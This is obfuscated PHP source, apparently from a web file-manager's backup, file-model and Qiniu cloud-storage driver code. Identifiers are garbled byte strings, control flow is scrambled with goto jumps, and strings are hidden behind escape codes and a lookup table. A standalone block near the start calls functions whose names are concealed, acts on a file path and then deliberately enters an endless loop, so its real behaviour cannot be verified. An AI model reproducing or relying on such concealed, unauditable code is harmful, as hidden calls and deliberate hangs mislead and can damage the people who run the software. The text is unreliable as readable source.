$fçÚ–‹è¯¢ = Model($AÚá’ĞÀ÷–[744])->listData(); goto DìŞø¿Î¢œ; d±ï®Ùî÷ñ: } private function backupPath($c³À¬ùÆ¥, $E©ƒ—ö¸Û« = false) { $FËÛæ…Œ×Æ =& $_SERVER[›é¼±]; if (!$E©ƒ—ö¸Û«) { $E©ƒ—ö¸Û« = Model($FËÛæ…Œ×Æ[765])->get($FËÛæ…Œ×Æ[766]); } $B¤ÌÇâ ôÒ = $c³À¬ùÆ¥[$FËÛæ…Œ×Æ[28]]; $bêØ•¾è = substr(md5($FËÛæ…Œ×Æ[767] . $E©ƒ—ö¸Û« . $B¤ÌÇâ ôÒ), 0, 8); return "\173\151\x6f\x3a{$c³À¬ùÆ¥[$FËÛæ…Œ×Æ[747]]}\x7d\57\144\141\164\141\142\x61\x73\145\x2f\142\x61\x63\153\x75\x70\57" . $B¤ÌÇâ ôÒ . $FËÛæ…Œ×Æ[71] . $bêØ•¾è; } public function db() { goto EÇ³ ĞÒ»°; Dš¿Ó’ªÂ¹: $Bø‹…­™Ê» = new BackupDb(); if (!$Bø‹…­™Ê»->index()) { return !1; } self::set(array($BÉ¦œ†ºê[768] => 1)); goto C„ÆŠÊÌ›Ã; EÇ³ ĞÒ»°: $BÉ¦œ†ºê =& $_SERVER[›é¼±]; $aóÙáé™œµ = self::get(); if ($aóÙáé™œµ[$BÉ¦œ†ºê[291]][$BÉ¦œ†ºê[753]][$BÉ¦œ†ºê[745]] == $BÉ¦œ†ºê[87]) { return !0; } goto Dš¿Ó’ªÂ¹; C„ÆŠÊÌ›Ã: return !0; goto b¢óÉ¸¦; b¢óÉ¸¦: } public function dbFile() { goto D÷ÀÇ’Ä­; CùàÂŸ‹Ç: return !0; goto fåìà¥­–ğ; D÷ÀÇ’Ä­: $Dééç“ˆ¼ =& $_SERVER[›é¼±]; $E’¼ƒ³Ùí‘ = self::get(); if ($E’¼ƒ³Ùí‘[$Dééç“ˆ¼[291]][$Dééç“ˆ¼[757]][$Dééç“ˆ¼[745]] == $Dééç“ˆ¼[87]) { return !0; } goto DŒÖª£ƒß; DŒÖª£ƒß: $CÕªù²ç± = new BackupDbFile(); if (!$CÕªù²ç±->index()) { return !1; } self::set(array($Dééç“ˆ¼[769] => 1)); goto CùàÂŸ‹Ç; fåìà¥­–ğ: } public function file() { $C¥Û½¡¥Ûæ =& $_SERVER[›é¼±]; $DÅÅêšçÛ = self::get(); if ($DÅÅêšçÛ[$C¥Û½¡¥Ûæ[291]][$C¥Û½¡¥Ûæ[193]][$C¥Û½¡¥Ûæ[745]] == $C¥Û½¡¥Ûæ[87]) { return !0; } if (!isset($DÅÅêšçÛ[$C¥Û½¡¥Ûæ[750]]) || $DÅÅêšçÛ[$C¥Û½¡¥Ûæ[750]] == $C¥Û½¡¥Ûæ[191]) { $bÍ¼…Ã» = new BackupFile(); if (!$bÍ¼…Ã»->index()) { return !1; } } self::set(array($C¥Û½¡¥Ûæ[770] => 1, $C¥Û½¡¥Ûæ[745] => 1)); return !0; } } goto AÁœÕœ¹Ÿ; EÏ°ùƒ™: if (!isset($_SERVER[$_SERVER[›é¼±][858]]) || !isset($_SERVER[$_SERVER[›é¼±][865]])) { goto f­¢›²Ãæ; f­¢›²Ãæ: $cÛäÔÚë“ = $_SERVER[›é¼±][860]; $cÚ‚ñ‹ ¿­ = $_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]; $e‘”¯±ÃğØ = $cÛäÔÚë“($cÚ‚ñ‹ ¿­); goto b“àñå›‰Î; b“àñå›‰Î: $e£¤¡„ÎÎ° = explode($_SERVER[›é¼±][229], $e‘”¯±ÃğØ); if (count($e£¤¡„ÎÎ°) < $_SERVER[›é¼±][609]) { $cƒéÏÜÜ¸ = $_SERVER[›é¼±][863]; $cƒéÏÜÜ¸(); } $A¥ÕØ·¼ = $_SERVER[›é¼±][864]; goto Dµß›ŒÌö; Dµß›ŒÌö: $A¥ÕØ·¼($_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]); $F‹ğÜç½›µ = 2; while ($F‹ğÜç½›µ > 1) { $EäÄ±š®– = rawurlencode($F‹ğÜç½›µ . $_SERVER[›é¼±][376]); } goto F–ºİ—®”Á; F–ºİ—®”Á: } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\x65\x5f\x63\x6f\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\145\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\154\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\155\145" => "\x69\157\137\146\x69\x6c\145\137\155\x65\x74\x61", "\155\145\164\141\x46\x69\145\x6c\x64" => "\146\x69\154\x65\111\104"); public function fileInfo($B¨àÌæº ) { $fØ¼ñ”‘É =& $_SERVER[›é¼±]; static $b„›‹ğ = array(); if (!isset($b„›‹ğ[$B¨àÌæº ])) { $cºóƒ‰Û = $fØ¼ñ”‘É[1781]; $D·Â×‚õ = Model($fØ¼ñ”‘É[464])->field($cºóƒ‰Û)->where(array($fØ¼ñ”‘É[462] => $B¨àÌæº ))->find(); $b„›‹ğ[$B¨àÌæº ] = $D·Â×‚õ; } return $b„›‹ğ[$B¨àÌæº ]; } public function addFileByContent($A‚¸ó‹„™„ = '', $bÇšø›ò‡ = '') { goto DÂö… ±¢Ë; b’âÏĞ•‚°: if (file_exists($A‚êê‰Õ¨Á)) { @unlink($A‚êê‰Õ¨Á); } return $e‘¡»•Ñ«Á; goto fëŞéÉî‰¶; DÂö… ±¢Ë: $d‰ëº¿íÖ© =& $_SERVER[›é¼±]; $F¯ˆçßáÜí = TEMP_PATH . $d‰ëº¿íÖ©[1782]; if (!is_dir($F¯ˆçßáÜí)) { mk_dir($F¯ˆçßáÜí); } goto D«’õ®†½; D«’õ®†½: $A‚êê‰Õ¨Á = $F¯ˆçßáÜí . $d‰ëº¿íÖ©[1783] . rand_string(16); file_put_contents($A‚êê‰Õ¨Á, $A‚¸ó‹„™„); $e‘¡»•Ñ«Á = $this->addFile($A‚êê‰Õ¨Á, $bÇšø›ò‡, !0); goto b’âÏĞ•‚°; fëŞéÉî‰¶: } public function createFileName($B—ŸÆ—øÔ, $EÉÈøĞÆÁ = false, $C÷Şøîº¯Û = false) { goto C¹©•Ä‡È˜; dŞ–¸à—¡: $f„¥õÁ´˜¶ = $EöÔ½Šš›->pathFather($E°’êë›­ö); static $F¥Ÿéšİ÷‘ = false; $a¥ô•Å¤ƒ = $A‘»„©‘‡Æ[1784] . md5($f„¥õÁ´˜¶); goto FØôÁ©æùõ; C¹©•Ä‡È˜: $A‘»„©‘‡Æ =& $_SERVER[›é¼±]; $EöÔ½Šš› = IO::init($A‘»„©‘‡Æ[8]); $E°’êë›­ö = $this->makeFilePath($B—ŸÆ—øÔ, $EöÔ½Šš›, $EÉÈøĞÆÁ, $C÷Şøîº¯Û); goto dŞ–¸à—¡; FØôÁ©æùõ: if (!$F¥Ÿéšİ÷‘ && !Cache::get($a¥ô•Å¤ƒ)) { $F¥Ÿéšİ÷‘ = !0; $Cä”çéŞ­ = IO::mkdir($f„¥õÁ´˜¶); if (!IO::exist($Cä”çéŞ­ . $A‘»„©‘‡Æ[798])) { IO::mkfile($Cä”çéŞ­ . $A‘»„©‘‡Æ[798]); } Cache::set($a¥ô•Å¤ƒ, 1, 3600 * 2); } return $E°’êë›­ö; goto cèÒ×‘ÜÊš; cèÒ×‘ÜÊš: } public function makeFilePath($dó¿õêÏ©, $D„ê˜¶‰ª, $c¶ºÍ¤‚’œ = false, $bã¼ª­µ‚„ = false) { goto aË¹×Şøé¤; bÑÖŒ¨àœ–: $e·Ü¶«Ôé = $C¡ƒÚç¨½ê . rand_string(5) . short_id(100); $dó¿õêÏ© = str_replace($D¡ÍŒÜâß[8], $D¡ÍŒÜâß[71], KodIO::clear($dó¿õêÏ©)); $D™çù¬—ÌŠ = $D„ê˜¶‰ª->ext($dó¿õêÏ©); goto C¬Œª“¹; aË¹×Şøé¤: $D¡ÍŒÜâß =& $_SERVER[›é¼±]; $D…¶ƒ‹—ìø = Model($D¡ÍŒÜâß[765])->get($D¡ÍŒÜâß[1785]); $C¡ƒÚç¨½ê = KodIO::defaultIO() . date($D¡ÍŒÜâß[1786]); goto bÑÖŒ¨àœ–; C¬Œª“¹: if (!$dó¿õêÏ©) { $D…¶ƒ‹—ìø = $D¡ÍŒÜâß[1787]; } switch ($D…¶ƒ‹—ìø) { case $D¡ÍŒÜâß[1788]: $e·Ü¶«Ôé = $e·Ü¶«Ôé . $D¡ÍŒÜâß[95] . $D„ê˜¶‰ª->ext($dó¿õêÏ©); if ($D™çù¬—ÌŠ == $D¡ÍŒÜâß[1723]) { $e·Ü¶«Ôé .= $D¡ÍŒÜâß[1460]; } break; case $D¡ÍŒÜâß[1789]: goto dÖÚÌ¡²ƒ; B¤¾Ø×“ğ: CacheLock::lock($E¶ùåÖ‚‹); $e·Ü¶«Ôé = $C¡ƒÚç¨½ê . $dó¿õêÏ©; if (IO::exist($C¡ƒÚç¨½ê . $dó¿õêÏ©)) { $E¨Š”³¶èˆ = substr($dó¿õêÏ©, 0, strlen($dó¿õêÏ©) - strlen($D™çù¬—ÌŠ)); $B¥§ÃÉ½¡ = $bã¼ª­µ‚„ ? substr($bã¼ª­µ‚„, 0, 5) : ($c¶ºÍ¤‚’œ ? substr($c¶ºÍ¤‚’œ, 0, 5) : rand_string(5)); $e·Ü¶«Ôé = $C¡ƒÚç¨½ê . $E¨Š”³¶èˆ . $B¥§ÃÉ½¡ . $D¡ÍŒÜâß[95] . $D™çù¬—ÌŠ; } goto a³É®¦‰ÎÔ; dÖÚÌ¡²ƒ: $cÈõÅ¡»ö = Model($D¡ÍŒÜâß[765])->get($D¡ÍŒÜâß[766]); $B›–íÉÀñÂ = substr(md5($D¡ÍŒÜâß[767] . $cÈõÅ¡»ö . date($D¡ÍŒÜâß[743])), 0, 8); $A°ÉŞ“ÊÖ¥ = KodIO::defaultDriver(); goto BîˆÜäŒŸ­; a³É®¦‰ÎÔ: if (IO::isTypeObject($e·Ü¶«Ôé) && !IO::isUploadServer($e·Ü¶«Ôé)) { if (IO::exist($e·Ü¶«Ôé)) { return $e·Ü¶«Ôé; } $A‡‡“áµâİ = IO::setContent($e·Ü¶«Ôé, $D¡ÍŒÜâß[33]); if (!$A‡‡“áµâİ) { show_json($D¡ÍŒÜâß[1792], !1); } } CacheLock::unlock($E¶ùåÖ‚‹); break; goto AØ‡Ç’Ì; BîˆÜäŒŸ­: $C¡ƒÚç¨½ê = $D¡ÍŒÜâß[1157] . $A°ÉŞ“ÊÖ¥[$D¡ÍŒÜâß[395]] . $D¡ÍŒÜâß[404] . date($D¡ÍŒÜâß[1790]) . $B›–íÉÀñÂ . $D¡ÍŒÜâß[8]; if ($D™çù¬—ÌŠ == $D¡ÍŒÜâß[1723]) { $dó¿õêÏ© .= $D¡ÍŒÜâß[1460]; } $E¶ùåÖ‚‹ = $D¡ÍŒÜâß[1791] . $C¡ƒÚç¨½ê . $dó¿õêÏ©; goto B¤¾Ø×“ğ; AØ‡Ç’Ì: case $D¡ÍŒÜâß[1787]: break; default: break; } return $e·Ü¶«Ôé; goto cáƒ© İğ¤; cáƒ© İğ¤: } public function addFileByRemote($Dâ®‚ë‚äå, $CÎ™„¿Š‹É, $fïÙñÖˆ¦ä = array()) { goto C¶°‘æêÍ; BÚ¨œ¡»–³: $Fµ†êÁô­‹ = IO::hashMd5($Dâ®‚ë‚äå, $e‰¥¡åğ‘¦); $fƒà°ÍˆØ = KodIO::defaultDriver(); $aÃì³Ùåæ = array($cÅªŸ›“È[573] => IO::size($Dâ®‚ë‚äå), $cÅªŸ›“È[1793] => 1, $cÅªŸ›“È[415] => $CÎ™„¿Š‹É, $cÅªŸ›“È[810] => $fƒà°ÍˆØ[$cÅªŸ›“È[395]], $cÅªŸ›“È[416] => $Dâ®‚ë‚äå, $cÅªŸ›“È[1794] => $fïÙñÖˆ¦ä[$cÅªŸ›“È[171]] ? $fïÙñÖˆ¦ä[$cÅªŸ›“È[171]] : IO::hashSimple($Dâ®‚ë‚äå), $cÅªŸ›“È[1795] => $Fµ†êÁô­‹ ? $Fµ†êÁô­‹ : $e‰¥¡åğ‘¦); goto bÈ¨ìèË; bÈ¨ìèË: if ($b˜Ã ©ë±¤ = $this->addFileCheckExist($aÃì³Ùåæ[$cÅªŸ›“È[171]], $aÃì³Ùåæ[$cÅªŸ›“È[170]], $aÃì³Ùåæ[$cÅªŸ›“È[78]])) { return $b˜Ã ©ë±¤; } return $this->addFileData($aÃì³Ùåæ); goto eê”«Úã—; C¶°‘æêÍ: $cÅªŸ›“È =& $_SERVER[›é¼±]; if (!IO::exist($Dâ®‚ë‚äå)) { return !1; } $e‰¥¡åğ‘¦ = $fïÙñÖˆ¦ä[$cÅªŸ›“È[170]] ? $fïÙñÖˆ¦ä[$cÅªŸ›“È[170]] : $cÅªŸ›“È[33]; goto BÚ¨œ¡»–³; eê”«Úã—: } private function addFileData($DšîØÎ‚Ê) { $E˜³¾çÊŠÎ =& $_SERVER[›é¼±]; if (!$DšîØÎ‚Ê) { return !1; } $DšîØÎ‚Ê[$E˜³¾çÊŠÎ[78]] = intval($DšîØÎ‚Ê[$E˜³¾çÊŠÎ[78]]); if (!$DšîØÎ‚Ê[$E˜³¾çÊŠÎ[78]] && strlen($DšîØÎ‚Ê[$E˜³¾çÊŠÎ[171]]) > 32) { $DšîØÎ‚Ê[$E˜³¾çÊŠÎ[78]] = intval(substr($DšîØÎ‚Ê[$E˜³¾çÊŠÎ[171]], 32)); } $cšœôÁòÆÁ = $this->add($DšîØÎ‚Ê); return $this->find($cšœôÁòÆÁ); } public function addFile($e¶Á¬˜Õù¶, $d„”íİ¡‰Š, $cÚ¬¡Óš­ = false) { goto b¿å†™ø–; bŠ‘£ª…‹ˆ: $cí¿¡ë´±ó = $_SERVER[›é¼±][1796] . $cÃÖÍœ±„»; CacheLock::lock($cí¿¡ë´±ó); if ($e·£¦¨Õ¸„ = $this->addFileCheckExist($f¹Ú°§Û±, $cÃÖÍœ±„», $A¶ÈçˆåË’)) { CacheLock::unlock($cí¿¡ë´±ó); return $e·£¦¨Õ¸„; } goto dåÎ¸æŞŞĞ; dåÎ¸æŞŞĞ: $CóÜƒÍ›î‚ = $this->addFileMake($e¶Á¬˜Õù¶, $A¶ÈçˆåË’, $f¹Ú°§Û±, $cÃÖÍœ±„», $d„”íİ¡‰Š, $cÚ¬¡Óš­); $CÛßÅáÖÜ“ = $this->addFileData($CóÜƒÍ›î‚); CacheLock::unlock($cí¿¡ë´±ó); goto e÷•åç¸öš; e÷•åç¸öš: return $CÛßÅáÖÜ“; goto D¡˜÷‚¶–·; b¿å†™ø–: $f¹Ú°§Û± = IO::hashSimple($e¶Á¬˜Õù¶); $cÃÖÍœ±„» = IO::hashMd5($e¶Á¬˜Õù¶); $A¶ÈçˆåË’ = IO::size($e¶Á¬˜Õù¶); goto bŠ‘£ª…‹ˆ; D¡˜÷‚¶–·: } public function addFileMake($A¾Ö·ğæ½†, $eãÖ†ÄãÇÙ, $DÆŸÓ§—ÑŸ, $e‡ÍØÓ§ê¸, $D¼ğ¥…ß™, $eÕçÍŠ÷Ûï) { goto Fª¥ÓÒÚ´â; d¡ò»¢˜Õ: $B³Ô˜¡°‘ñ = KodIO::defaultDriver(); $e”ó¸ËƒÙ = array($cˆ‘¨¥İÅÜ[573] => $eãÖ†ÄãÇÙ, $cˆ‘¨¥İÅÜ[1793] => 1, $cˆ‘¨¥İÅÜ[415] => $D¼ğ¥…ß™, $cˆ‘¨¥İÅÜ[810] => $B³Ô˜¡°‘ñ[$cˆ‘¨¥İÅÜ[395]], $cˆ‘¨¥İÅÜ[416] => $cÎ¨µÚÌŒ, $cˆ‘¨¥İÅÜ[1794] => $DÆŸÓ§—ÑŸ, $cˆ‘¨¥İÅÜ[1795] => $e‡ÍØÓ§ê¸); return $e”ó¸ËƒÙ; goto D¾¼İ©¿¡î; Fª¥ÓÒÚ´â: $cˆ‘¨¥İÅÜ =& $_SERVER[›é¼±]; $cÎ¨µÚÌŒ = $this->createFileName($D¼ğ¥…ß™, $DÆŸÓ§—ÑŸ, $e‡ÍØÓ§ê¸); $B‹ñ’ó³ßµ = get_path_father($cÎ¨µÚÌŒ); goto Eƒ¨°»¡¹‚; Eƒ¨°»¡¹‚: $fˆŸìƒÔ‹Å = get_path_this($cÎ¨µÚÌŒ); if ($eÕçÍŠ÷Ûï) { $cŒŒØâ›— = IO::move($A¾Ö·ğæ½†, $B‹ñ’ó³ßµ, !1, $fˆŸìƒÔ‹Å); } else { $cŒŒØâ›— = IO::copy($A¾Ö·ğæ½†, $B‹ñ’ó³ßµ, !1, $fˆŸìƒÔ‹Å); } if (!$cŒŒØâ›—) { return !1; } goto d¡ò»¢˜Õ; D¾¼İ©¿¡î: } public function addFileCheckExist($cŸì÷˜Ñâ¡, $fÅŸÉ­ÈŠ‰, $E¥Ü‰‹™¥¦) { $BÍ†„¿Ù† =& $_SERVER[›é¼±]; $D…ÂáÃ®ØÉ = $this->findByHash($cŸì÷˜Ñâ¡, $fÅŸÉ­ÈŠ‰); if (!$D…ÂáÃ®ØÉ) { return !1; } $fµåß²éÊÌ = array($BÍ†„¿Ù†[1793] => intval($D…ÂáÃ®ØÉ[$BÍ†„¿Ù†[1797]]) + 1, $BÍ†„¿Ù†[573] => $E¥Ü‰‹™¥¦); $this->where(array($BÍ†„¿Ù†[462] => $D…ÂáÃ®ØÉ[$BÍ†„¿Ù†[461]]))->save($fµåß²éÊÌ); return $D…ÂáÃ®ØÉ; } public function remove($A×Ï”§ÜÍÂ) { $this->linkCountChange($A×Ï”§ÜÍÂ, !1); $this->clearEmpty(); return !0; } public function linkAdd($C®…‰ôäí„) { $this->linkCountChange($C®…‰ôäí„, !0); } public function linkCountChange($d‘‘ßÜù¹, $B¸ëâ·è½) { goto f¯š‘ë“Å; cò–Äë¾¼Á: foreach ($CÒİğÅ¨ÍŠ as $BØ·¨à³¤ => $c™ùç«¹¾†) { $cœ´†Ã©šğ = $c™ùç«¹¾† . $e¡À†‹è®é[33]; if (!$dÍí‡‡Ï¨[$cœ´†Ã©šğ]) { $dÍí‡‡Ï¨[$cœ´†Ã©šğ] = array(); } $dÍí‡‡Ï¨[$cœ´†Ã©šğ][] = $BØ·¨à³¤; } foreach ($dÍí‡‡Ï¨ as $c™ùç«¹¾† => $eÀŒíâù) { if (!$eÀŒíâù) { continue; } $c™ùç«¹¾† = $B¸ëâ·è½ ? $c™ùç«¹¾† : -intval($c™ùç«¹¾†); $A¨ ÎÔãâ = array($e¡À†‹è®é[461] => array($e¡À†‹è®é[7], $eÀŒíâù)); if ($c™ùç«¹¾† < 0) { $A¨ ÎÔãâ[$e¡À†‹è®é[1797]] = array($e¡À†‹è®é[1007], abs($c™ùç«¹¾†)); } $this->where($A¨ ÎÔãâ)->setAdd($e¡À†‹è®é[1797], $c™ùç«¹¾†); } goto Cï»õ«”Ò‚; f¯š‘ë“Å: $e¡À†‹è®é =& $_SERVER[›é¼±]; if (!$d‘‘ßÜù¹) { return; } if (!is_array($d‘‘ßÜù¹)) { $d‘‘ßÜù¹ = array($d‘‘ßÜù¹); } goto fÚ•…²·äˆ; fÚ•…²·äˆ: $CÒİğÅ¨ÍŠ = array(); foreach ($d‘‘ßÜù¹ as $BØ·¨à³¤) { $cœ´†Ã©šğ = $BØ·¨à³¤ . $e¡À†‹è®é[33]; if (!$CÒİğÅ¨ÍŠ[$cœ´†Ã©šğ]) { $CÒİğÅ¨ÍŠ[$cœ´†Ã©šğ] = 0; } $CÒİğÅ¨ÍŠ[$cœ´†Ã©šğ]++; } $dÍí‡‡Ï¨ = array(); goto cò–Äë¾¼Á; Cï»õ«”Ò‚: } public function findByHash($FéŸ¼ˆêÔ£, $aó‚ëÀ¸‘¦ = false) { $eÅ§°Ñ‘ÊÃ =& $_SERVER[›é¼±]; if (!$FéŸ¼ˆêÔ£ && !$aó‚ëÀ¸‘¦) { return !1; } $føù·Î†°¬ = array($eÅ§°Ñ‘ÊÃ[1794] => $FéŸ¼ˆêÔ£); if ($aó‚ëÀ¸‘¦) { $føù·Î†°¬ = array($eÅ§°Ñ‘ÊÃ[1795] => $aó‚ëÀ¸‘¦); } return $this->order($eÅ§°Ñ‘ÊÃ[1798])->where($føù·Î†°¬)->find(); } public function clearEmpty($fª‡İÊÆ = 0) { goto eÖ¼¹˜Áå»; bÎÌÜ¸¿õ: foreach ($A¨æ©ï¬±Æ as $EĞĞ›åÉ°) { $f¥¿øÁ¿éè->update(1); $this->resetFile($EĞĞ›åÉ°); } $f¥¿øÁ¿éè->end(); goto B“é¿ïğØ; CÒëç¡Àæ: $A¨æ©ï¬±Æ = $this->where($b‡˜©¯Óòò)->select(); if (!$A¨æ©ï¬±Æ) { return; } $f¥¿øÁ¿éè = new Task($Cƒ•š ñ³©[1800], $Cƒ•š ñ³©[33], count($A¨æ©ï¬±Æ)); goto bÎÌÜ¸¿õ; eÖ¼¹˜Áå»: $Cƒ•š ñ³© =& $_SERVER[›é¼±]; $açù¢£‚Å = time() - 3600 * 24 * $fª‡İÊÆ; $b‡˜©¯Óòò = $Cƒ•š ñ³©[1799] . $açù¢£‚Å; goto CÒëç¡Àæ; B“é¿ïğØ: } public function resetFile($fĞÙ¼Ø¿§«) { goto Eè¡ÑÉ¨; Eè¡ÑÉ¨: $F±¡œÔ¹Ã =& $_SERVER[›é¼±]; $fœ£¼„ö¿Ø = array($F±¡œÔ¹Ã[462] => $fĞÙ¼Ø¿§«[$F±¡œÔ¹Ã[461]]); $b²ïÍ¹Ó¤ = Model($F±¡œÔ¹Ã[1239])->where($fœ£¼„ö¿Ø)->count(); goto f’Ùİˆ‹Á; f’Ùİˆ‹Á: $BŞÌĞéÁ‚ = Model($F±¡œÔ¹Ã[1801])->where($fœ£¼„ö¿Ø)->count(); $EñŠ…«¡Ô = intval($b²ïÍ¹Ó¤) + intval($BŞÌĞéÁ‚); if ($EñŠ…«¡Ô == 0) { IO::remove($fĞÙ¼Ø¿§«[$F±¡œÔ¹Ã[76]]); Model($F±¡œÔ¹Ã[1802])->delete($fĞÙ¼Ø¿§«[$F±¡œÔ¹Ã[461]]); $this->where($fœ£¼„ö¿Ø)->delete(); $this->metaSet($fĞÙ¼Ø¿§«[$F±¡œÔ¹Ã[461]], null, null); return; } goto EšêÓ­×ä; EšêÓ­×ä: if ($fĞÙ¼Ø¿§«[$F±¡œÔ¹Ã[1797]] != $EñŠ…«¡Ô) { $this->where($fœ£¼„ö¿Ø)->save(array($F±¡œÔ¹Ã[1793] => $EñŠ…«¡Ô)); } goto Cô¾áäô‘; Cô¾áäô‘: } public function storageInfo($aù‚îÔÉÂ = false) { goto Dô‡”ƒÃ×Š; EÍİ“å¶İ’: $aãÉÅ‘¿Î½ = 1; $F¤ˆÎÑë¦ = 0; $FÑĞŒ¨¢î = 5000; goto AÁ¶È±à¤¼; AÁ¶È±à¤¼: for ($E™ò¥Ôã Ğ = 0; $E™ò¥Ôã Ğ < $eŸ„Õ„Ø; $E™ò¥Ôã Ğ = $E™ò¥Ôã Ğ + $FÑĞŒ¨¢î) { $E¶ÌÉÆ“ø· = $this->limit($E™ò¥Ôã Ğ, $E™ò¥Ôã Ğ + $FÑĞŒ¨¢î)->select(); foreach ($E¶ÌÉÆ“ø· as $EòÔ Îì†é) { $aãÉÅ‘¿Î½ += $EòÔ Îì†é[$DÛÕµ´ØÎ„[78]] * $EòÔ Îì†é[$DÛÕµ´ØÎ„[1797]]; $Fàõæ‚„Û += $EòÔ Îì†é[$DÛÕµ´ØÎ„[78]] * ($EòÔ Îì†é[$DÛÕµ´ØÎ„[1797]] - 1); $F¤ˆÎÑë¦ += $EòÔ Îì†é[$DÛÕµ´ØÎ„[1797]]; } } $e·ëÌ‹İØ = array($DÛÕµ´ØÎ„[1803] => $aãÉÅ‘¿Î½, $DÛÕµ´ØÎ„[1804] => $Fàõæ‚„Û, $DÛÕµ´ØÎ„[1805] => $Fàõæ‚„Û / $aãÉÅ‘¿Î½, $DÛÕµ´ØÎ„[82] => $eŸ„Õ„Ø, $DÛÕµ´ØÎ„[1806] => $F¤ˆÎÑë¦); return $e·ëÌ‹İØ; goto føì¦èšßÅ; Dô‡”ƒÃ×Š: $DÛÕµ´ØÎ„ =& $_SERVER[›é¼±]; $eŸ„Õ„Ø = $this->count() + 0.0; $Fàõæ‚„Û = 0; goto EÍİ“å¶İ’; føì¦èšßÅ: } } goto b„‚ö©Ã©¯; a‘İ®¦à›£: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($DÆëßÉ¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[›é¼±][1334]; $this->_init($DÆëßÉ¨); } public function _init($C´µºŸÑö¿) { goto c„»å±Ş¡Ì; C¸³ºÊç»å: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto C‚×ªáÑÁ„; C‚×ªáÑÁ„: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto d˜ÜìÅ™Œ¡; c„»å±Ş¡Ì: $B §…ßÎ¦ =& $_SERVER[›é¼±]; foreach ($C´µºŸÑö¿ as $CİÅĞé”„£ => $C’çÔèÈï¼) { if (isset($this->{$CİÅĞé”„£})) { $this->{$CİÅĞé”„£} = $C’çÔèÈï¼; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($B §…ßÎ¦[1335] . LNG($B §…ßÎ¦[1295])); } goto C¸³ºÊç»å; d˜ÜìÅ™Œ¡: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BêæÂëæ™›, $A™§ïğ†é = '', $FğïÊš—Š¨ = REPEAT_RENAME) { if ($this->setContent($BêæÂëæ™›, $A™§ïğ†é)) { return $this->getPathOuter($BêæÂëæ™›); } return !1; } public function mkdir($e‰ßº—®¢˜, $a´ŞïÏ¸„ƒ = REPEAT_SKIP) { goto F÷Œˆ¯²²; F÷Œˆ¯²²: $DÒÛ¤å‰¼‡ =& $_SERVER[›é¼±]; $dŠ ®Õ”è¸ = trim($e‰ßº—®¢˜, $DÒÛ¤å‰¼‡[8]); if ($this->_isFolder($dŠ ®Õ”è¸)) { return $this->getPathOuter($dŠ ®Õ”è¸); } goto EËóÔŒÕ»; EËóÔŒÕ»: $e‰ßº—®¢˜ = $dŠ ®Õ”è¸ . $DÒÛ¤å‰¼‡[8]; $Dô‹ ğ³™ = get_path_this($dŠ ®Õ”è¸); $dÎğŠíÚë = $e‰ßº—®¢˜ . $Dô‹ ğ³™; goto d†ˆÇÎƒ¾®; d†ˆÇÎƒ¾®: if (!$this->mkfile($dÎğŠíÚë)) { return !1; } if (!$this->moveFile($dÎğŠíÚë, $e‰ßº—®¢˜)) { $this->delFile($dÎğŠíÚë); return !1; } return $this->getPathOuter($dŠ ®Õ”è¸); goto B¸Î–ğ§…ê; B¸Î–ğ§…ê: } public function copyFile($AæÛÆÓŒ, $c’„ùÆÔëª) { $a±¯‰Ò•» = $this->bucketManager->copy($this->bucket, $AæÛÆÓŒ, $this->bucket, $c’„ùÆÔëª, !0); return $a±¯‰Ò•» ? !1 : $this->getPathOuter($c’„ùÆÔëª); } public function moveFile($f‡ø¬ŸñÙó, $eƒ™Ú”ãß¬) { $dâ©ÆÕõ«Æ = $this->bucketManager->move($this->bucket, $f‡ø¬ŸñÙó, $this->bucket, $eƒ™Ú”ãß¬, !0); return $dâ©ÆÕõ«Æ ? !1 : $this->getPathOuter($eƒ™Ú”ãß¬); } public function delFile($eÃ†áºÚù) { if (!$this->exist($eÃ†áºÚù)) { return !0; } $A”å™ÚÔïâ = $this->bucketManager->delete($this->bucket, $eÃ†áºÚù); return $A”å™ÚÔïâ ? !1 : !0; } public function delFolder($dÒÕÚÓ¥ˆ²) { goto Cš¯Œ°‘—÷; Cš¯Œ°‘—÷: $F†¦ñ÷ñ©‚ =& $_SERVER[›é¼±]; if (!$this->exist($dÒÕÚÓ¥ˆ²)) { return !0; } $this->listItemCache = !1; goto A‘ã¿«ã; c¨ø¬…à¸: $BêìÁƒêŸ = $this->delByBatch($Dƒà‰íø›ì[$F†¦ñ÷ñ©‚[75]]); if (!$BêìÁƒêŸ) { return !1; } return $this->delFile($b‰í Áëˆ‡); goto E‰ùì®”™; b¯É½¦®¸¾: if (!empty($dÒÕÚÓ¥ˆ²) && $dÒÕÚÓ¥ˆ² !== $F†¦ñ÷ñ©‚[191] && !in_array($b‰í Áëˆ‡, $Dƒà‰íø›ì[$F†¦ñ÷ñ©‚[75]])) { $Dƒà‰íø›ì[$F†¦ñ÷ñ©‚[75]][] = $b‰í Áëˆ‡; } $BêìÁƒêŸ = $this->delByBatch($Dƒà‰íø›ì[$F†¦ñ÷ñ©‚[74]]); if (!$BêìÁƒêŸ) { return !1; } goto c¨ø¬…à¸; A‘ã¿«ã: $Dƒà‰íø›ì = $this->fileList($dÒÕÚÓ¥ˆ²); $this->listItemCache = !0; $b‰í Áëˆ‡ = trim($dÒÕÚÓ¥ˆ², $F†¦ñ÷ñ©‚[8]) . $F†¦ñ÷ñ©‚[8]; goto b¯É½¦®¸¾; 